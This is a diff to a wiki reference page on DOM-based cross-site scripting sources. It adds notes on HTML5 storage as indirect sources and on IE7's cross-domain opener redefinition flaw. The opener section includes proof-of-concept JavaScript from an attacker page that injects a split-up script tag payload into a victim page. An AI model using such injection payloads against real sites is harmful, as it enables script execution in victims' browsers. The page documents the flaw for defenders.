@@ -219,13 +219,56 @@ The window.name attribute is a persistent value during the existence of the page
 
 An attacker can set new windows names and frames with no restriction, and they will persist during navigation on any domain.
 
+=== Indirect Sources ===
+
+HTML 5 Storage objects [#References [[6]][[7]][[8]]] can be considered an indirect source, since they can be used to store values from direct sources and use them later insecurely.
+
+Indirect source objects are:
+
+* localStorage 
+* sessionStorage
+* Database (Safari Only)
+
+
+
 === Other Objects Sources ===
 
+
  * opener (IE <= 7 Only)
- * parent.obj
- * top.obj
- * frames`[`i`]`.obj
+ * parent/top/frames`[`i`]`.obj
  * event.data of onmessage event for postMessage method
+
+==== Opener ====
+
+In 2008 in [#References [[5]]] it was presented a study about Browser Based DOM Xss, describing how browsers behave when objects belonging to different windows and domains are overwritten or deleted from evil pages.
+
+It was found that IE <= 7 allows cross windows/cross domain opener redefinition.
+
+{{{
+// From attacker.tld
+window.aFrame.location="http://victim/PageUsingOpenerObject.html"
+window.aFrame.opener={someAttr:"someValue", someAttr2: function(){return someReturnValue}}
+}}}
+
+So if a page from victim host uses:
+{{{
+<script>
+document.writeln("<p>" + window.opener.Message + "</p>");
+</script>
+}}}
+
+An attacker can use from {{{<iframe name=aFrame></iframe>}}}
+{{{
+// From attacker.tld
+window.aFrame.location="http://victim/PageUsingOpenerObject.html"
+window.aFrame.opener={Message:"<sc"+"ript>alert(document.domain)</scr"+"ipt>"}
+}}}
+
+The code above works perfectly on IE7 and the fake Message is taken by victim host, without any error message.
+
+Opener object can, hence, be considered as a source of untrusted input in the unfortunate case the victim uses IE 7.
+
+N.B. IE 8 fixes this issue.
 
 = Glossary =
 
@@ -246,3 +289,9 @@ In this case a DOM Based Xss.
 `[`4`]` [http://kuza55.blogspot.com/2008/02/understanding-cookie-security.html Understanding Cookie Security] , A. Kuza, February 22, 2008.
 
 `[`5`]` [http://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf Http Parameter Pollution] , L. Carettoni S. Di Paola, 2009. 
+
+`[`6`]` [http://dev.w3.org/html5/webdatabase/ W3C ClientSide Database]
+
+`[`7`]` [http://dev.w3.org/html5/webstorage W3C Web Storage]
+
+`[`8`]` [http://msdn.microsoft.com/en-us/library/cc197062%28VS.85%29.aspx Microsoft's Introduction to DOM Storage]
